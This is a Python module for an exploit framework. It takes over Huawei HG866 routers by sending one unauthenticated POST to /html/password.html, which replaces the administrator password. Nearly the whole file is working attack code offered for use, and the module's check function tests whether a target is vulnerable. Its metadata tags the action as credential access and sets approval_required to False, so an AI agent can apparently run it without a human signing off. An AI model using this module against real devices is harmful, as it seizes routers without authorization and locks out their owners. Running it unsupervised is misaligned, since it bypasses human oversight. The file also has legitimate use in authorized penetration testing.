#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Huawei HG866 Password Change"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'Huawei HG866 Password Change',
        'description': 'Module exploits password change vulnerability in Huawei HG866 devices. If the target is vulnerable it allows to change administration password.',
        'author': ['hkm', 'Marcin Bury'],
        
        'platform': Platform.LINUX,
        'references': ['https://www.exploit-db.com/exploits/19185/'],
        'tags': ['iot', 'router', 'disclosure', 'credentials', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")
    password = OptString('kittysploit', 'Password value to change admin account with')

    def run(self):
        if self.check():
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            data = {'psw': self.password,
                    'reenterpsw': self.password,
                    'save': 'Apply'}

            print_status("Sending password change request")
            response = self.http_request(
                method="POST",
                path="/html/password.html",
                headers=headers,
                data=data
            )

            if response.status_code == 200:
                print_success("Administrator's password has been changed to {}".format(self.password))
            else:
                print_error("Exploit failed - could not change password")
        else:
            print_error("Exploit failed - target seems to be not vulnerable")
    def check(self):
        response = self.http_request(
            method="GET",
            path="/html/password.html"
        )
        if response is None:
            return False  # target is not vulnerable

        if response.status_code == 200 and "psw" in response.text and "reenterpsw" in response.text:
            return True  # target is vulnerable

        return False  # target not vulnerable
